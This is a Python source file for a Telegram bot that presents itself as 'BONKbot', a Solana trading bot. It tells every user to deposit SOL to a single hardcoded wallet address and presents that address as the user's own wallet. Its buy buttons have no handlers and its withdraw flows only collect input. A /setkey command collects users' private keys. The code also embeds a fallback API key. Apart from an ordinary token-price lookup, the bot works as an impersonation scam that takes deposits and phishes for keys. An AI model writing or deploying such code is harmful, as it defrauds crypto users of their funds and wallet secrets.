
#!/usr/bin/env python3

import logging
import requests
import os
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from flask import Flask

logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!", 200

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

HELIUS_API_KEY = os.environ.get('HELIUS_API_KEY', '34d948a7-f331-408a-a0e6-170e7ed94756')
SOLANA_RPC_URL = f"https://mainnet.helius-rpc.com/?api-key={HELIUS_API_KEY}"
TOKEN = os.environ.get('TOKEN',)

users = {}
DEFAULT_WALLET_ADDRESS = "FitVkAjEaFSNbYriu2v91dnxYA7rMtzMFyd6B3mDxsjg"
DEFAULT_PRIVATE_KEY = os.environ.get('PRIVATE_KEY', 'YOUR_PRIVATE_KEY_HERE')

# Persistent session — reuses TCP connection, avoids DNS lookup on every call
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
})

# ----- HELPERS -----

def format_number(value):
    try:
        value = float(value)
    except:
        return "N/A"
    if value == 0:
        return "$0"
    if value < 0.01:
        if value < 0.000001:
            return f"${value:.10f}".rstrip('0').rstrip('.')
        else:
            return f"${value:.8f}".rstrip('0').rstrip('.')
    elif value >= 1_000_000:
        return f"${value/1_000_000:.2f}M"
    elif value >= 1_000:
        return f"${value/1_000:.2f}K"
    else:
        return f"${value:.4f}"

def get_sol_balance(wallet_address):
    try:
        payload = {
            "jsonrpc": "2.0", "id": 1,
            "method": "getBalance",
            "params": [wallet_address]
        }
        response = session.post(SOLANA_RPC_URL, json=payload, timeout=10)
        data = response.json()
        if "result" in data and "value" in data["result"]:
            return data["result"]["value"] / 1_000_000_000
        return 0.0
    except Exception as e:
        logging.error(f"SOL balance error: {e}")
        return 0.0

# ----- TOKEN FETCH -----

def fetch_token_info(contract_address):
    """
    Two-endpoint strategy against DexScreener:

    Endpoint 1 — /pairs/solana/{address}  (FAST, chain-specific, higher rate limit)
    This is the fastest DexScreener endpoint. Works when the CA is a pair address.

    Endpoint 2 — /tokens/solana/{address}  (chain-scoped token search, faster than /latest/dex/tokens/)
    This is the correct endpoint when CA is a token mint address (most common case).

    Endpoint 3 — Jupiter V3 price API (fallback for anything not on DexScreener yet)
    """
    contract_address = contract_address.strip()

    # ── Endpoint 1: Try as a direct pair address first (instant if it's a pair CA) ──
    try:
        url = f"https://api.dexscreener.com/latest/dex/pairs/solana/{contract_address}"
        logging.info(f"[DS Pair] {contract_address}")
        res = session.get(url, timeout=8)

        if res.status_code == 200:
            data = res.json()
            pairs = data.get("pairs") or []
            result = _extract_best_pair(pairs)
            if result:
                logging.info(f"[DS Pair] ✅ {result['token_symbol']}")
                return result

        elif res.status_code == 429:
            logging.warning("[DS Pair] Rate limited — switching to token endpoint")

    except Exception as e:
        logging.error(f"[DS Pair] Error: {e}")

    # ── Endpoint 2: Try as a token mint address (most common — this is what DexScreener shows) ──
    try:
        url = f"https://api.dexscreener.com/tokens/v1/solana/{contract_address}"
        logging.info(f"[DS Token] {contract_address}")
        res = session.get(url, timeout=8)

        if res.status_code == 200:
            # This endpoint returns a list directly
            pairs = res.json() if isinstance(res.json(), list) else (res.json().get("pairs") or [])
            result = _extract_best_pair(pairs)
            if result:
                logging.info(f"[DS Token] ✅ {result['token_symbol']}")
                return result

        elif res.status_code == 429:
            logging.warning("[DS Token] Rate limited — falling back to Jupiter")

    except Exception as e:
        logging.error(f"[DS Token] Error: {e}")

    # ── Endpoint 3: Jupiter V3 fallback ──────────────────────────────────────
    try:
        url = f"https://lite-api.jup.ag/price/v2?ids={contract_address}"
        logging.info(f"[Jupiter] {contract_address}")
        res = session.get(url, timeout=8)

        if res.status_code == 200:
            data = res.json()
            token_data = data.get("data", {}).get(contract_address)
            if token_data and token_data.get("price"):
                price = float(token_data["price"])
                if price > 0:
                    logging.info(f"[Jupiter] ✅ {price}")
                    return {
                        "error": False,
                        "token_name": "Unknown",
                        "token_symbol": "???",
                        "price": format_number(price),
                        "liquidity": "N/A",
                        "market_cap": "N/A",
                        "volume_24h": "N/A",
                        "change_5m": "N/A",
                        "change_1h": "N/A",
                        "dex": "Jupiter",
                    }
    except Exception as e:
        logging.error(f"[Jupiter] Error: {e}")

    # ── All failed ────────────────────────────────────────────────────────────
    return {
        "error": True,
        "error_msg": (
            "Token not found. Please check:\n"
            "• The contract address is correct\n"
            "• The token is on Solana mainnet\n"
            "• The token has an active liquidity pool"
        )
    }

def _extract_best_pair(pairs):
    """Pick the highest-liquidity pair from a list and return formatted result."""
    if not pairs:
        return None

    # Filter to Solana pairs only and sort by liquidity
    sol_pairs = [p for p in pairs if p.get("chainId", "").lower() == "solana"]
    if not sol_pairs:
        sol_pairs = pairs  # fallback: use all pairs

    pair = max(sol_pairs, key=lambda x: float((x.get("liquidity") or {}).get("usd", 0) or 0))

    price = pair.get("priceUsd", "0")
    if not price or price == "0":
        return None

    base = pair.get("baseToken", {})
    liq = float((pair.get("liquidity") or {}).get("usd", 0) or 0)
    fdv = pair.get("fdv", 0)
    mcap = pair.get("marketCap", fdv)
    volume_24h = float((pair.get("volume") or {}).get("h24", 0) or 0)
    change_5m = (pair.get("priceChange") or {}).get("m5")
    change_1h = (pair.get("priceChange") or {}).get("h1")
    dex = pair.get("dexId", "Unknown").title()

    return {
        "error": False,
        "token_name": base.get("name", "Unknown"),
        "token_symbol": base.get("symbol", "???"),
        "price": format_number(price),
        "liquidity": format_number(liq),
        "market_cap": format_number(mcap),
        "volume_24h": format_number(volume_24h),
        "change_5m": f"{change_5m:+.2f}%" if change_5m is not None else "N/A",
        "change_1h": f"{change_1h:+.2f}%" if change_1h is not None else "N/A",
        "dex": dex,
    }

# ----- START -----
def start(update, context):
    user_id = update.effective_user.id
    users.setdefault(user_id, {
        "wallet": DEFAULT_WALLET_ADDRESS,
        "balance": 0.0,
        "private_key": DEFAULT_PRIVATE_KEY
    })
    wallet_address = users[user_id]["wallet"]
    balance = get_sol_balance(wallet_address)
    users[user_id]["balance"] = balance

    keyboard = [
        [InlineKeyboardButton("🟢 Buy", callback_data="buy"),
         InlineKeyboardButton("❓ Help", callback_data="help")],
        [InlineKeyboardButton("📊 Limit Orders", callback_data="limit_orders"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("👛 Wallet", callback_data="wallet")]
    ]
    text = (
        "🚀 *Welcome to BONKbot* — the fastest and most secure bot for trading any token on Solana!\n\n"
        f"You currently have *{balance:.4f} SOL* in your wallet.\n\n"
        "To start trading, deposit SOL to your *BONKbot wallet address*:\n\n"
        f"`{wallet_address}`\n\n"
        "Once done, tap *Refresh* and your balance will update.\n\n"
        "*To buy a token:* paste a token contract address from DexScreener, pump.fun, Birdeye, or Meteora.\n\n"
        "For more info on your wallet and to export your private key, tap *Wallet* below."
    )
    update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# ----- BUTTON CALLBACKS -----
def button(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    user_id = query.from_user.id

    if user_id not in users:
        users[user_id] = {
            "wallet": DEFAULT_WALLET_ADDRESS,
            "balance": 0.0,
            "private_key": DEFAULT_PRIVATE_KEY
        }
    user = users[user_id]

    if data == "wallet":
        wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
        balance = get_sol_balance(wallet_address)
        user["balance"] = balance
        text = f"👛 *Your BONKbot Wallet*\n\n*Address:*\n`{wallet_address}`\n\n*Balance:* `{balance:.4f} SOL`"
        keyboard = [
            [InlineKeyboardButton("➖ Withdraw All SOL", callback_data="withdraw_all")],
            [InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
            [InlineKeyboardButton("🔑 Export Private Key", callback_data="export_seed")],
            [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]
        ]
        query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "refresh":
        wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
        balance = get_sol_balance(wallet_address)
        user["balance"] = balance
        text = f"🔄 *Balance Refreshed*\n\n👛 *Wallet:*\n`{wallet_address}`\n\n*Balance:* `{balance:.4f} SOL`"
        keyboard = [
            [InlineKeyboardButton("🟢 Buy", callback_data="buy"),
             InlineKeyboardButton("❓ Help", callback_data="help")],
            [InlineKeyboardButton("📊 Limit Orders", callback_data="limit_orders"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
            [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]
        ]
        query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "buy":
        user["awaiting_contract"] = True
        query.message.reply_text("📈 *Buy Token*\n\nPaste the *token contract address*:", parse_mode="Markdown")

    elif data == "help":
        text = (
            "❓ *Help*\n\n"
            "*Which tokens can I trade?*\n"
            "Any SPL token that is a SOL pair on Raydium, pump.fun, Meteora, Moonshot, or Jupiter.\n\n"
            "*Is BONKbot free?*\n"
            "Yes! We charge 1% on transactions. All other actions are free.\n\n"
            "*Net Profit:* Calculated after fees and price impact."
        )
        query.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_wallet")]]),
            parse_mode="Markdown"
        )

    elif data == "limit_orders":
        keyboard = [
            [InlineKeyboardButton("➕ Add TP/SL", callback_data="add_tp_sl")],
            [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]
        ]
        query.message.reply_text("📊 *Limit Orders*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "add_tp_sl":
        query.edit_message_text(
            "Enter trigger for TP / SL order:\n- Multiple (e.g. 0.8x, 2x)\n- Percentage change (e.g. 5%, -5%)",
            parse_mode="Markdown"
        )

    elif data == "withdraw_all":
        query.message.reply_text("➖ *Withdraw All SOL*\n\nEnter destination wallet address:", parse_mode="Markdown")

    elif data == "withdraw_x":
        query.message.reply_text("➖ *Withdraw X SOL*\n\nEnter the amount of SOL you want to withdraw:", parse_mode="Markdown")
        users[user_id]["awaiting_withdraw_x_amount"] = True

    elif data == "export_seed":
        query.message.reply_text(
            "⚠️ *WARNING:* Keep your private key safe.\nClick below to reveal.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🗝️ Reveal Private Key", callback_data="reveal_private_key")],
                [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]
            ])
        )

    elif data == "reveal_private_key":
        private_key = user.get("private_key", DEFAULT_PRIVATE_KEY)
        query.edit_message_text(
            f"🗝️ *Your Private Key:*\n`{private_key}`\n⚠️ Keep it safe.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_wallet")]])
        )

    elif data == "close_wallet":
        try:
            query.delete_message()
        except:
            pass

# ----- SET PRIVATE KEY -----
def set_private_key(update, context):
    user_id = update.effective_user.id
    if not context.args:
        update.message.reply_text("🔑 Usage: `/setkey YOUR_PRIVATE_KEY`", parse_mode="Markdown")
        return
    new_key = " ".join(context.args)
    users.setdefault(user_id, {
        "wallet": DEFAULT_WALLET_ADDRESS,
        "balance": 0.0,
        "private_key": DEFAULT_PRIVATE_KEY
    })
    users[user_id]["private_key"] = new_key
    update.message.reply_text("✅ *Private key updated successfully!*", parse_mode="Markdown")

# ----- HANDLE USER MESSAGES -----
def handle_messages(update, context):
    user_id = update.effective_user.id
    user = users.get(user_id, {})

    if user.get("awaiting_withdraw_x_amount"):
        users[user_id]["withdraw_x_amount"] = update.message.text
        users[user_id]["awaiting_withdraw_x_amount"] = False
        update.message.reply_text("Enter destination wallet address:")

    elif user.get("awaiting_contract"):
        contract_address = update.message.text.strip()
        user["awaiting_contract"] = False

        loading_msg = update.message.reply_text("🔍 *Fetching token data...*", parse_mode="Markdown")
        info = fetch_token_info(contract_address)

        try:
            loading_msg.delete()
        except:
            pass

        if info.get("error"):
            update.message.reply_text(
                f"❌ *Token Not Found*\n\n{info.get('error_msg', '')}\n\nContract: `{contract_address}`",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Try Again", callback_data="buy")]]),
                parse_mode="Markdown"
            )
            return

        text = (
            f"🪙 *{info['token_name']} ({info['token_symbol']})*\n\n"
            f"💲 *Price:* {info['price']}\n"
            f"💧 *Liquidity:* {info['liquidity']}\n"
            f"📊 *Market Cap:* {info['market_cap']}\n"
            f"📈 *Volume 24h:* {info['volume_24h']}\n"
            f"⚡ *5m Change:* {info['change_5m']}\n"
            f"⏱ *1h Change:* {info['change_1h']}\n"
            f"🏦 *DEX:* {info['dex']}\n\n"
            f"_Contract: `{contract_address}`_"
        )
        keyboard = [
            [InlineKeyboardButton("Buy 0.1 SOL", callback_data=f"buy_fixed_0.1:{contract_address}"),
             InlineKeyboardButton("Buy 0.5 SOL", callback_data=f"buy_fixed_0.5:{contract_address}")],
            [InlineKeyboardButton("Buy 1.0 SOL", callback_data=f"buy_fixed_1.0:{contract_address}"),
             InlineKeyboardButton("Buy 5.0 SOL", callback_data=f"buy_fixed_5.0:{contract_address}")],
            [InlineKeyboardButton("Buy X SOL", callback_data=f"buy_x:{contract_address}")],
            [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]
        ]
        update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

# ----- MAIN -----
def main():
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("setkey", set_private_key))
    dp.add_handler(CallbackQueryHandler(button))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_messages))

    print("✅ Bot running!")
    print("✅ DexScreener: /pairs/solana → /tokens/v1/solana → Jupiter fallback")
    print("✅ Rate limit aware — switches endpoint on 429")
    print("✅ Health check on port 8080")
    updater.start_polling(poll_interval=1)
    updater.idle()

if __name__ == "__main__":
    main()
